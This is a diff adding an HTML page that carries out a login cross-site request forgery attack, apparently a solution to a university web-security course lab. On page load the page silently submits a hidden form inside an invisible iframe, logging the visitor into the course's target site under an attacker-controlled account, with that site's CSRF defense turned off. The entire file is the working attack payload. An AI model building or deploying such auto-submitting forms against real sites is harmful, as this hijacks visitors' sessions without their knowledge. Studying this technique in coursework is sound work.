@@ -1,0 +1,16 @@
+<html>
+  <head>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  </head>
+
+
+  <body onload="document.csrfform.submit()">
+    <form action='http://bungle-cs461.csl.illinois.edu/login?csrfdefense=0&xssdefense=5' method='POST' target="hiddenframe" name="csrfform">
+      <input type="hidden" name="username" value="attacker"  />
+      <input type="hidden" name="password" value="l33th4x"  />
+    </form>
+      <iframe name="hiddenframe" style="display: none;"></iframe>
+  </body>
+</html>
+
